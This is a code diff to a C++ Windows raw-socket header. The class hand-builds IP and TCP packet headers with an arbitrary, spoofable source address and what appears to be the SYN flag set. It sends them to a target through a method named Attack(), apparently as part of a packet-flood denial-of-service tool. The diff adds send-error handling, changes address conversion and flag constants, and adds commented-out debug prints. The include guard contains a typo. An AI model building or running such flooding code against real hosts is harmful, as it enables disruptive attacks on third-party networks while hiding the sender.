@@ -1,6 +1,8 @@
 #ifndef _SOCKET_H_
 #define _SCOKET_H_
 
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
+
 #include <WinSock2.h>
 #include <WS2tcpip.h>
 #include <Windows.h>
@@ -10,8 +12,8 @@
 
 #define MAXPORT		65535 
 #define IP_VERSION_AND_HDRLEN_BIT		0b01000101
-#define IP_FRAGMENT_BIT					0b0100000000000000
-#define TCP_REGISTER_BIT				0b0000000000000010
+#define IP_FRAGMENT_BIT					0b0000001000000000
+#define TCP_REGISTER_BIT				0b1000000000000010
 
 typedef struct IPHEADHER {
 	unsigned char		ip_VersionAndHdrLen;
@@ -43,7 +45,7 @@ private:
 	SOCKET rawSock = INVALID_SOCKET;
 	sockaddr_in dstAddr;
 	WORD wsaVersion = MAKEWORD(2, 2);
-	int optival = 1;
+	BOOL optival = TRUE;
 	int payLoad = 512;
 	char startBuf[1000],* data;
 	ip_hdr* ipHdr;
@@ -97,9 +99,17 @@ public:
 		ipHdr->ip_Protocol = IPPROTO_TCP;
 		ipHdr->ip_CheckSum = 0;
 		//IP 등록
-		inet_pton(AF_INET, srcIP, &ipHdr->ip_SrcIP);
-		inet_pton(AF_INET, dstIP, &ipHdr->IP_DstIP);
-	
+		ipHdr->ip_SrcIP = inet_addr(srcIP);
+		ipHdr->IP_DstIP = inet_addr(dstIP);
+
+		/*IP 체크용
+		char checkIP[100];
+		inet_ntop(AF_INET, &ipHdr->ip_SrcIP, checkIP, sizeof(checkIP));
+		printf("SrcIP : %s \n", checkIP);
+		inet_ntop(AF_INET, &ipHdr->IP_DstIP, checkIP, sizeof(checkIP));
+		printf("SrcIP : %s \n", checkIP);
+		*/
+
 		//TC 헤더 값 설정
 		tcpHdr = (tcp_hdr*)(startBuf + sizeof(*ipHdr));
 		tcpHdr->reg = TCP_REGISTER_BIT;
@@ -108,6 +118,11 @@ public:
 		tcpHdr->tcp_SrcPort = htons(srcPort);
 		tcpHdr->tcp_DstPort = htons(dstPort);
 
+		/* TCP 포트 확인용
+		printf("SrcPort : %d \n", ntohs(tcpHdr->tcp_SrcPort));
+		printf("SrcPort : %d \n", ntohs(tcpHdr->tcp_DstPort));
+		*/
+
 		//data 주소 값 입력
 		data = startBuf + sizeof(*ipHdr) + sizeof(*tcpHdr);
 	};
@@ -115,7 +130,10 @@ public:
 	void Attack() {
 		int size = sizeof(*ipHdr) + sizeof(*tcpHdr) + payLoad;
 		auto result = sendto(rawSock, startBuf, size, 0, (sockaddr*)&dstAddr, sizeof(dstAddr));
-		
+		if (result == SOCKET_ERROR) {
+			printf("RawSocket sendto Error \n");
+			exit(1);
+		}
 	};
 	
 	void ShowSocketAddr() {
